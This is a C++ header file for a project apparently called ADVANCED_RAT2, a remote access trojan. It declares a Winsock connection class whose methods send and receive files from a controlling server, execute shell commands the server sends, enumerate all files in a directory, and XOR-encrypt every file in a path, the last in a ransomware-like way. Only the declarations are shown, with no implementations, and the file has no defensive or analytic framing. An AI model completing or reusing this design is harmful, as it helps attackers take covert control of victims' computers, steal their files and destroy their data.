//
// Created by avita on 07/08/2020.
//

#ifndef ADVANCED_RAT2_CONNECTION_H
#define ADVANCED_RAT2_CONNECTION_H

#include <iostream>
#include <string>
#include <cstring>
#include <WS2tcpip.h>
#include <vector>
#include <memory>
#include <fstream>
#include <windows.h>
#include<algorithm>
#include <filesystem>


#define BufferSize 1024


#pragma warning(disable:4996)

#pragma comment(lib, "ws2_32.lib")


using namespace std;


class Connection {
    string ip;
    int port;
    vector<filesystem::path> *files;
    SOCKET sock;

    //Initialize ip and string
    Connection(string ip, unsigned int port);

    //Sending the file in path to the server
    void sendFile(string path);

    //Getting file from the server and save it in path
    void recvFile(string path);

    //Sending message to the server
    void sendMessage(string message);

    //Getting command from the server
    void executeShell(string shell);

    //Saving all files in path
    vector<filesystem::path> &getAllFiles(string path, vector<filesystem::path> files);

    //Encrypt data with xor encryption with key
    string encryptData(string data, string key);

    //Encrypt all the files in path with xor
    void encryptFiles(string path);

    //Read file in path
    string readFile(filesystem::path path);

    //Write data to a file in path
    void writeToFile(filesystem::path path, auto data);

    //Creating the connection
    void connection(SOCKET socket);


};


#endif //ADVANCED_RAT2_CONNECTION_H